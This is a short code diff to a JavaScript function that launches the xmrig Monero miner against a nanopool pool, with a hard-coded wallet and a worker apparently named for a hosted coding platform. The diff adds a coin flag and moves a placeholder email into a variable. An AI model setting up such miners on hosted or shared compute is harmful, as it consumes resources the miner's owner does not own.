@@ -29,11 +29,13 @@ async function startMining() {
   const pool = 'xmr-eu1.nanopool.org:14444';
   const wallet = '48ahQdgq3V2Vtoh6We2sM1YH6BSQxH4m9T4G38AJkubkYZBxye2B9kWgCHTEYiq5Wyb52xjTYY4CAie75T41iCr91gGZ9UP';
   const workerName = 'replit-worker';
+  const email = 'your@email.com';
 
   const xmrig = spawn('./xmrig', [
     '-o', pool,
-    '-u', `${wallet}.${workerName}/your@email.com`,
+    '-u', `${wallet}.${workerName}/${email}`,
     '-p', 'x',
+    '--coin', 'monero', // <--- Important fix: specify the coin
     '--donate-level=1',
     '--cpu-priority=5',
     '--max-cpu-usage=75'
